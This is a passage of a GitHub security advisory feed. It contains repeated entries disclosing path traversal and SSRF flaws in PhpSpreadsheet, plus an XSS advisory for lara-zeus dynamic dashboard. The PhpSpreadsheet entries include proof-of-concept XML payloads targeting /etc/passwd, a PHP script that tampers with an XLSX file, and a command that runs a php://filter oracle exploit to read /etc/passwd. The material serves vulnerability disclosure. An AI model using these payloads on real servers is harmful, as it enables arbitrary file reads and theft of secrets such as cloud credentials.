<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a">https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec">https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465">https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465</a></li>
<li><a href="https://github.com/advisories/GHSA-w9xv-qf98-ccq4">https://github.com/advisories/GHSA-w9xv-qf98-ccq4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w9xv-qf98-ccq4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T15:58:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows absolute path traversal and Server-Side Request Forgery in HTML writer when embedding images is enabled]]></title>
        <id>https://github.com/advisories/GHSA-w9xv-qf98-ccq4</id>
        <link href="https://github.com/advisories/GHSA-w9xv-qf98-ccq4"/>
        <updated>2024-10-07T15:58:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>It's possible for an attacker to construct an XLSX file that links images from arbitrary paths. When embedding images has been enabled in HTML writer with <code>$writer-&gt;setEmbedImages(true);</code> those files will be included in the output as <code>data:</code> URLs, regardless of the file's type. Also URLs can be used for embedding, resulting in a Server-Side Request Forgery vulnerability.</p>
<h3 id="details">Details</h3>
<p>XLSX files allow embedding or linking media. When </p>
<p>In <code>xl/drawings/drawing1.xml</code> an attacker can do e.g.:</p>
<pre><code class="language-xml">&lt;a:blip cstate="print" r:link="rId1" /&gt;
</code></pre>
<p>And then, in <code>xl/drawings/_rels/drawing1.xml.rels</code> they can set the path to anything, such as:</p>
<pre><code class="language-xml">&lt;Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="/etc/passwd" /&gt;
</code></pre>
<p>or</p>
<pre><code class="language-xml">&lt;Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="http://example.org" /&gt;
</code></pre>
<p>When the HTML writer is outputting the image, it does not check the path in any way. Also the <code>getimagesize()</code> call does not mitigate this, because when <code>getimagesize()</code> returns false, an empty mime type is used.</p>
<pre><code class="language-php">if ($this-&gt;embedImages || str_starts_with($imageData, 'zip://')) {
    $picture = @file_get_contents($filename);
    if ($picture !== false) {
        $imageDetails = getimagesize($filename) ?: ['mime' =&gt; ''];
        // base64 encode the binary data
        $base64 = base64_encode($picture);
        $imageData = 'data:' . $imageDetails['mime'] . ';base64,' . $base64;
    }
}

$html .= '&lt;img style="position: absolute; z-index: 1; left: '
    . $drawing-&gt;getOffsetX() . 'px; top: ' . $drawing-&gt;getOffsetY() . 'px; width: '
    . $drawing-&gt;getWidth() . 'px; height: ' . $drawing-&gt;getHeight() . 'px;" src="'
    . $imageData . '" alt="' . $filedesc . '" /&gt;';
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-php">&lt;?php

require 'vendor/autoload.php';

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader-&gt;load(__DIR__ . '/book.xlsx');

$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
$writer-&gt;setEmbedImages(true);
$output = $writer-&gt;generateHTMLAll();

// The below is just for demo purposes

$pattern = '/data:;base64,(?&lt;data&gt;[^"]+)/i';

preg_match_all($pattern, $output, $matches);

print("*** /etc/passwd content: ***\n");
print(base64_decode($matches['data'][0]));

print("*** HTTP response content: ***\n");
print(base64_decode($matches['data'][1]));
</code></pre>
<p>Add this file in the same directory:
<a href="https://github.com/PHPOffice/PhpSpreadsheet/files/15213066/book.xlsx">book.xlsx</a></p>
<p>Run with:
<code>php index.php</code></p>
<h3 id="impact">Impact</h3>
<p>When embedding images has been enabled, an attacker can read arbitrary files on the server and perform arbitrary HTTP GET requests, potentially e.g. <a href="https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/">revealing secrets</a>. Note that any PHP protocol wrappers can be used, meaning that if for example the <code>expect://</code> wrapper is enabled, also remote code execution is possible.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a">https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec">https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465">https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465</a></li>
<li><a href="https://github.com/advisories/GHSA-w9xv-qf98-ccq4">https://github.com/advisories/GHSA-w9xv-qf98-ccq4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w9xv-qf98-ccq4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T15:58:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows absolute path traversal and Server-Side Request Forgery when opening XLSX file]]></title>
        <id>https://github.com/advisories/GHSA-5gpr-w2p5-6m37</id>
        <link href="https://github.com/advisories/GHSA-5gpr-w2p5-6m37"/>
        <updated>2024-10-07T15:57:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>It's possible for an attacker to construct an XLSX file which links media from external URLs. When opening the XLSX file, PhpSpreadsheet retrieves the image size and type by reading the file contents, if the provided path is a URL. By using specially crafted <code>php://filter</code> URLs an attacker can leak the contents of any file or URL.</p>
<p>Note that this vulnerability is different from <a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4">GHSA-w9xv-qf98-ccq4</a>, and resides in a different component.</p>
<h3 id="details">Details</h3>
<p>When an XLSX file is opened, the XLSX reader calls <code>setPath()</code> with the path provided in the <code>xl/drawings/_rels/drawing1.xml.rels</code> file in the XLSX archive:</p>
<pre><code class="language-php">if (isset($images[$embedImageKey])) {
    // ...omit irrelevant code...
} else {
    $linkImageKey = (string) self::getArrayItem(
        $blip-&gt;attributes('http://schemas.openxmlformats.org/officeDocument/2006/relationships'),
        'link'
    );
    if (isset($images[$linkImageKey])) {
        $url = str_replace('xl/drawings/', '', $images[$linkImageKey]);
        $objDrawing-&gt;setPath($url);
    }
}
</code></pre>
<p><code>setPath()</code> then reads the file in order to determine the file type and dimensions, if the path is a URL:</p>
<pre><code class="language-php">public function setPath(string $path, bool $verifyFile = true, ?ZipArchive $zip = null): static
{
    if ($verifyFile &amp;&amp; preg_match('~^data:image/[a-z]+;base64,~', $path) !== 1) {
        // Check if a URL has been passed. https://stackoverflow.com/a/2058596/1252979
        if (filter_var($path, FILTER_VALIDATE_URL)) {
            $this-&gt;path = $path;
            // Implicit that it is a URL, rather store info than running check above on value in other places.
            $this-&gt;isUrl = true;
            $imageContents = file_get_contents($path);
            // ... check dimensions etc. ...
</code></pre>
<p>It's important to note here, that <code>filter_var</code> considers also <code>file://</code> and <code>php://</code> URLs valid.</p>
<p>The attacker can set the path to anything:</p>
<pre><code class="language-xml">&lt;Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="this can be whatever" /&gt;
</code></pre>
<p>The contents of the file are not made available for the attacker directly. However, using PHP filter URLs it's possible to construct an <a href="https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle">error oracle</a> which leaks a file or URL contents one character at a time. The error oracle was originally invented by @hash_kitten, and the folks at Synacktiv have developed a nice tool for easily exploiting those: <a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></p>
<h3 id="poc">PoC</h3>
<p>Target file:</p>
<pre><code class="language-php">&lt;?php

require 'vendor/autoload.php';

// Attack part: this would actually be done by the attacker on their machine and the resulting XLSX uploaded, but to
// keep the PoC simple, I've combined this into the same file.

$file = "book_tampered.xlsx";
$payload = $_POST["payload"]; // the payload comes from the Python script

copy("book.xlsx",$file);
$zip = new ZipArchive;
$zip-&gt;open($file);

$path = "xl/drawings/_rels/drawing1.xml.rels";
$content = $zip-&gt;getFromName($path);
$content = str_replace("../media/image1.gif", $payload, $content);
$zip-&gt;addFromString($path, $content);

$path = "xl/drawings/drawing1.xml";
$content = $zip-&gt;getFromName($path);
$content = str_replace('r:embed="rId1"', 'r:link="rId1"', $content);
$zip-&gt;addFromString($path, $content);

$zip-&gt;close();

// The actual target - note that simply opening the file is sufficient for the attack

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader-&gt;load(__DIR__ . '/' . $file);
</code></pre>
<p>Add this file in the same directory:
<a href="https://github.com/PHPOffice/PhpSpreadsheet/files/15213296/book.xlsx">book.xlsx</a></p>
<p>Serve the PoC from a web server. Ensure your PHP memory limit is &lt;= 128M - otherwise you'll need to edit the Python script below.</p>
<p>Download the error oracle Python script from here: <a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a>. If your memory limit is greater than 128M, you'll need to edit the Python script's <code>bruteforcer.py</code> file to change <code>self.blow_up_inf = self.join(*[self.blow_up_utf32]*15)</code> to <code>self.blow_up_inf = self.join(*[self.blow_up_utf32]*20)</code>. This is needed so that it generates large-enough payloads to trigger the out of memory errors the oracle relies on. Also install the script's dependencies with <code>pip</code>.</p>
<p>Then run the Python script with:</p>
<pre><code>python3 filters_chain_oracle_exploit.py --target [URL of the script] --parameter payload --file /etc/passwd
</code></pre>
<p>Note that the attack relies on certain character encodings being supported by the system's <code>iconv</code> library, because PHP uses that. As far as I know, most Linux distributions have them, but notably MacOS does not. So if you're developing on a Mac, you'll want to run your server in a virtual machine with Linux.</p>
<p>Here's the results I got after about a minute of bruteforcing:</p>
<p><img alt="image" src="https://github.com/PHPOffice/PhpSpreadsheet/assets/1294941/06cbaf62-1001-481f-bbcd-d818a61896c4"></p>
<h3 id="impact">Impact</h3>
<p>An attacker can access any file on the server, or leak information form arbitrary URLs, potentially exposing sensitive information such as AWS IAM credentials.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-5gpr-w2p5-6m37">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-5gpr-w2p5-6m37</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a">https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec">https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465">https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465</a></li>
<li><a href="https://github.com/advisories/GHSA-5gpr-w2p5-6m37">https://github.com/advisories/GHSA-5gpr-w2p5-6m37</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5gpr-w2p5-6m37</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-07T15:57:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows absolute path traversal and Server-Side Request Forgery when opening XLSX file]]></title>
        <id>https://github.com/advisories/GHSA-5gpr-w2p5-6m37</id>
        <link href="https://github.com/advisories/GHSA-5gpr-w2p5-6m37"/>
        <updated>2024-10-07T15:57:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>It's possible for an attacker to construct an XLSX file which links media from external URLs. When opening the XLSX file, PhpSpreadsheet retrieves the image size and type by reading the file contents, if the provided path is a URL. By using specially crafted <code>php://filter</code> URLs an attacker can leak the contents of any file or URL.</p>
<p>Note that this vulnerability is different from <a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4">GHSA-w9xv-qf98-ccq4</a>, and resides in a different component.</p>
<h3 id="details">Details</h3>
<p>When an XLSX file is opened, the XLSX reader calls <code>setPath()</code> with the path provided in the <code>xl/drawings/_rels/drawing1.xml.rels</code> file in the XLSX archive:</p>
<pre><code class="language-php">if (isset($images[$embedImageKey])) {
    // ...omit irrelevant code...
} else {
    $linkImageKey = (string) self::getArrayItem(
        $blip-&gt;attributes('http://schemas.openxmlformats.org/officeDocument/2006/relationships'),
        'link'
    );
    if (isset($images[$linkImageKey])) {
        $url = str_replace('xl/drawings/', '', $images[$linkImageKey]);
        $objDrawing-&gt;setPath($url);
    }
}
</code></pre>
<p><code>setPath()</code> then reads the file in order to determine the file type and dimensions, if the path is a URL:</p>
<pre><code class="language-php">public function setPath(string $path, bool $verifyFile = true, ?ZipArchive $zip = null): static
{
    if ($verifyFile &amp;&amp; preg_match('~^data:image/[a-z]+;base64,~', $path) !== 1) {
        // Check if a URL has been passed. https://stackoverflow.com/a/2058596/1252979
        if (filter_var($path, FILTER_VALIDATE_URL)) {
            $this-&gt;path = $path;
            // Implicit that it is a URL, rather store info than running check above on value in other places.
            $this-&gt;isUrl = true;
            $imageContents = file_get_contents($path);
            // ... check dimensions etc. ...
</code></pre>
<p>It's important to note here, that <code>filter_var</code> considers also <code>file://</code> and <code>php://</code> URLs valid.</p>
<p>The attacker can set the path to anything:</p>
<pre><code class="language-xml">&lt;Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="this can be whatever" /&gt;
</code></pre>
<p>The contents of the file are not made available for the attacker directly. However, using PHP filter URLs it's possible to construct an <a href="https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle">error oracle</a> which leaks a file or URL contents one character at a time. The error oracle was originally invented by @hash_kitten, and the folks at Synacktiv have developed a nice tool for easily exploiting those: <a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></p>
<h3 id="poc">PoC</h3>
<p>Target file:</p>
<pre><code class="language-php">&lt;?php

require 'vendor/autoload.php';

// Attack part: this would actually be done by the attacker on their machine and the resulting XLSX uploaded, but to
// keep the PoC simple, I've combined this into the same file.

$file = "book_tampered.xlsx";
$payload = $_POST["payload"]; // the payload comes from the Python script

copy("book.xlsx",$file);
$zip = new ZipArchive;
$zip-&gt;open($file);

$path = "xl/drawings/_rels/drawing1.xml.rels";
$content = $zip-&gt;getFromName($path);
$content = str_replace("../media/image1.gif", $payload, $content);
$zip-&gt;addFromString($path, $content);

$path = "xl/drawings/drawing1.xml";
$content = $zip-&gt;getFromName($path);
$content = str_replace('r:embed="rId1"', 'r:link="rId1"', $content);
$zip-&gt;addFromString($path, $content);

$zip-&gt;close();

// The actual target - note that simply opening the file is sufficient for the attack

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader-&gt;load(__DIR__ . '/' . $file);
</code></pre>
<p>Add this file in the same directory:
<a href="https://github.com/PHPOffice/PhpSpreadsheet/files/15213296/book.xlsx">book.xlsx</a></p>
<p>Serve the PoC from a web server. Ensure your PHP memory limit is &lt;= 128M - otherwise you'll need to edit the Python script below.</p>
<p>Download the error oracle Python script from here: <a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a>. If your memory limit is greater than 128M, you'll need to edit the Python script's <code>bruteforcer.py</code> file to change <code>self.blow_up_inf = self.join(*[self.blow_up_utf32]*15)</code> to <code>self.blow_up_inf = self.join(*[self.blow_up_utf32]*20)</code>. This is needed so that it generates large-enough payloads to trigger the out of memory errors the oracle relies on. Also install the script's dependencies with <code>pip</code>.</p>
<p>Then run the Python script with:</p>
<pre><code>python3 filters_chain_oracle_exploit.py --target [URL of the script] --parameter payload --file /etc/passwd
</code></pre>
<p>Note that the attack relies on certain character encodings being supported by the system's <code>iconv</code> library, because PHP uses that. As far as I know, most Linux distributions have them, but notably MacOS does not. So if you're developing on a Mac, you'll want to run your server in a virtual machine with Linux.</p>
<p>Here's the results I got after about a minute of bruteforcing:</p>
<p><img alt="image" src="https://github.com/PHPOffice/PhpSpreadsheet/assets/1294941/06cbaf62-1001-481f-bbcd-d818a61896c4"></p>
<h3 id="impact">Impact</h3>
<p>An attacker can access any file on the server, or leak information form arbitrary URLs, potentially exposing sensitive information such as AWS IAM credentials.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-5gpr-w2p5-6m37">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-5gpr-w2p5-6m37</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a">https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec">https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465">https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465</a></li>
<li><a href="https://github.com/advisories/GHSA-5gpr-w2p5-6m37">https://github.com/advisories/GHSA-5gpr-w2p5-6m37</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5gpr-w2p5-6m37</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-07T15:57:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows absolute path traversal and Server-Side Request Forgery when opening XLSX file]]></title>
        <id>https://github.com/advisories/GHSA-5gpr-w2p5-6m37</id>
        <link href="https://github.com/advisories/GHSA-5gpr-w2p5-6m37"/>
        <updated>2024-10-07T15:57:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>It's possible for an attacker to construct an XLSX file which links media from external URLs. When opening the XLSX file, PhpSpreadsheet retrieves the image size and type by reading the file contents, if the provided path is a URL. By using specially crafted <code>php://filter</code> URLs an attacker can leak the contents of any file or URL.</p>
<p>Note that this vulnerability is different from <a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4">GHSA-w9xv-qf98-ccq4</a>, and resides in a different component.</p>
<h3 id="details">Details</h3>
<p>When an XLSX file is opened, the XLSX reader calls <code>setPath()</code> with the path provided in the <code>xl/drawings/_rels/drawing1.xml.rels</code> file in the XLSX archive:</p>
<pre><code class="language-php">if (isset($images[$embedImageKey])) {
    // ...omit irrelevant code...
} else {
    $linkImageKey = (string) self::getArrayItem(
        $blip-&gt;attributes('http://schemas.openxmlformats.org/officeDocument/2006/relationships'),
        'link'
    );
    if (isset($images[$linkImageKey])) {
        $url = str_replace('xl/drawings/', '', $images[$linkImageKey]);
        $objDrawing-&gt;setPath($url);
    }
}
</code></pre>
<p><code>setPath()</code> then reads the file in order to determine the file type and dimensions, if the path is a URL:</p>
<pre><code class="language-php">public function setPath(string $path, bool $verifyFile = true, ?ZipArchive $zip = null): static
{
    if ($verifyFile &amp;&amp; preg_match('~^data:image/[a-z]+;base64,~', $path) !== 1) {
        // Check if a URL has been passed. https://stackoverflow.com/a/2058596/1252979
        if (filter_var($path, FILTER_VALIDATE_URL)) {
            $this-&gt;path = $path;
            // Implicit that it is a URL, rather store info than running check above on value in other places.
            $this-&gt;isUrl = true;
            $imageContents = file_get_contents($path);
            // ... check dimensions etc. ...
</code></pre>
<p>It's important to note here, that <code>filter_var</code> considers also <code>file://</code> and <code>php://</code> URLs valid.</p>
<p>The attacker can set the path to anything:</p>
<pre><code class="language-xml">&lt;Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="this can be whatever" /&gt;
</code></pre>
<p>The contents of the file are not made available for the attacker directly. However, using PHP filter URLs it's possible to construct an <a href="https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle">error oracle</a> which leaks a file or URL contents one character at a time. The error oracle was originally invented by @hash_kitten, and the folks at Synacktiv have developed a nice tool for easily exploiting those: <a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></p>
<h3 id="poc">PoC</h3>
<p>Target file:</p>
<pre><code class="language-php">&lt;?php

require 'vendor/autoload.php';

// Attack part: this would actually be done by the attacker on their machine and the resulting XLSX uploaded, but to
// keep the PoC simple, I've combined this into the same file.

$file = "book_tampered.xlsx";
$payload = $_POST["payload"]; // the payload comes from the Python script

copy("book.xlsx",$file);
$zip = new ZipArchive;
$zip-&gt;open($file);

$path = "xl/drawings/_rels/drawing1.xml.rels";
$content = $zip-&gt;getFromName($path);
$content = str_replace("../media/image1.gif", $payload, $content);
$zip-&gt;addFromString($path, $content);

$path = "xl/drawings/drawing1.xml";
$content = $zip-&gt;getFromName($path);
$content = str_replace('r:embed="rId1"', 'r:link="rId1"', $content);
$zip-&gt;addFromString($path, $content);

$zip-&gt;close();

// The actual target - note that simply opening the file is sufficient for the attack

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader-&gt;load(__DIR__ . '/' . $file);
</code></pre>
<p>Add this file in the same directory:
<a href="https://github.com/PHPOffice/PhpSpreadsheet/files/15213296/book.xlsx">book.xlsx</a></p>
<p>Serve the PoC from a web server. Ensure your PHP memory limit is &lt;= 128M - otherwise you'll need to edit the Python script below.</p>
<p>Download the error oracle Python script from here: <a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a>. If your memory limit is greater than 128M, you'll need to edit the Python script's <code>bruteforcer.py</code> file to change <code>self.blow_up_inf = self.join(*[self.blow_up_utf32]*15)</code> to <code>self.blow_up_inf = self.join(*[self.blow_up_utf32]*20)</code>. This is needed so that it generates large-enough payloads to trigger the out of memory errors the oracle relies on. Also install the script's dependencies with <code>pip</code>.</p>
<p>Then run the Python script with:</p>
<pre><code>python3 filters_chain_oracle_exploit.py --target [URL of the script] --parameter payload --file /etc/passwd
</code></pre>
<p>Note that the attack relies on certain character encodings being supported by the system's <code>iconv</code> library, because PHP uses that. As far as I know, most Linux distributions have them, but notably MacOS does not. So if you're developing on a Mac, you'll want to run your server in a virtual machine with Linux.</p>
<p>Here's the results I got after about a minute of bruteforcing:</p>
<p><img alt="image" src="https://github.com/PHPOffice/PhpSpreadsheet/assets/1294941/06cbaf62-1001-481f-bbcd-d818a61896c4"></p>
<h3 id="impact">Impact</h3>
<p>An attacker can access any file on the server, or leak information form arbitrary URLs, potentially exposing sensitive information such as AWS IAM credentials.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-5gpr-w2p5-6m37">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-5gpr-w2p5-6m37</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a">https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec">https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465">https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465</a></li>
<li><a href="https://github.com/advisories/GHSA-5gpr-w2p5-6m37">https://github.com/advisories/GHSA-5gpr-w2p5-6m37</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5gpr-w2p5-6m37</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-07T15:57:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lara-zeus/artemis] Lara-zeus Dynamic Dashboard and Artemis do not validate paragraph widget values which can be used for XSS]]></title>
        <id>https://github.com/advisories/GHSA-c6cw-g7fc-4gwc</id>
        <link href="https://github.com/advisories/GHSA-c6cw-g7fc-4gwc"/>
        <updated>2024-10-07T14:55:31.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p>If values passed to a paragraph widget are not valid and contain a specific set of characters, applications are vulnerable to XSS attack against a user who opens a page on which a paragraph widget is rendered.</p>
<p>Versions of dynamic dashboard from v3.0.0 through v3.0.2 are affected.</p>
<p>Please upgrade to dynamic dashboard <a href="https://github.com/lara-zeus/dynamic-dashboard/releases/tag/v3.0.2">v3.0.2</a>.</p>
<h1 id="poc">PoC</h1>
<blockquote>
<p>PoC will be published in a few weeks, once developers have had a chance to upgrade their apps.</p>
</blockquote>
<h1 id="response">Response</h1>
<p>This vulnerability (in paragraph widget only) was reported by <strong>Raghav Sharma</strong>, who reported the issue and patched the issue during the morning of 05/10/2024. Thank you <strong>Raghav Sharma</strong>.</p>
<p>The review process concluded the same day at night, which revealed the issue was also present in paragraph widget. This was fixed the same day and dynamic dashboard <a href="https://github.com/lara-zeus/dynamic-dashboard/releases/tag/v3.0.2">v3.0.2</a> followed.</p>
<h2 id="note">Note:</h2>
<p>if you're published the view (blade files), you have to republish them or check the changes on release to update the affected file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lara-zeus/dynamic-dashboard/security/advisories/GHSA-c6cw-g7fc-4gwc">https://github.com/lara-zeus/dynamic-dashboard/security/advisories/GHSA-c6cw-g7fc-4gwc</a></li>
<li><a href="https://github.com/lara-zeus/artemis/commit/4636f58628d20d3e78ea8514406bd7da94997f2c">https://github.com/lara-zeus/artemis/commit/4636f58628d20d3e78ea8514406bd7da94997f2c</a></li>
<li><a href="https://github.com/lara-zeus/dynamic-dashboard/commit/adfb4b1cdfdaa01299631f0e569ce201a7cc545a">https://github.com/lara-zeus/dynamic-dashboard/commit/adfb4b1cdfdaa01299631f0e569ce201a7cc545a</a></li>
<li><a href="https://github.com/advisories/GHSA-c6cw-g7fc-4gwc">https://github.com/advisories/GHSA-c6cw-g7fc-4gwc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c6cw-g7fc-4gwc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T14:55:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lara-zeus/dynamic-dashboard] Lara-zeus Dynamic Dashboard and Artemis do not validate paragraph widget values which can be used for XSS]]></title>
        <id>https://github.com/advisories/GHSA-c6cw-g7fc-4gwc</id>
        <link href="https://github.com/advisories/GHSA-c6cw-g7fc-4gwc"/>
        <updated>2024-10-07T14:55:31.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p>If values passed to a paragraph widget are not valid and contain a specific set of characters, applications are vulnerable to XSS attack against a user who opens a page on which a paragraph widget is rendered.</p>
<p>Versions of dynamic dashboard from v3.0.0 through v3.0.2 are affected.</p>
<p>Please upgrade to dynamic dashboard <a href="https://github.com/lara-zeus/dynamic-dashboard/releases/tag/v3.0.2">v3.0.2</a>.</p>
<h1 id="poc">PoC</h1>
<blockquote>
<p>PoC will be published in a few weeks, once developers have had a chance to upgrade their apps.</p>
</blockquote>
<h1 id="response">Response</h1>
<p>This vulnerability (in paragraph widget only) was reported by <strong>Raghav Sharma</strong>, who reported the issue and patched the issue during the morning of 05/10/2024. Thank you <strong>Raghav Sharma</strong>.</p>
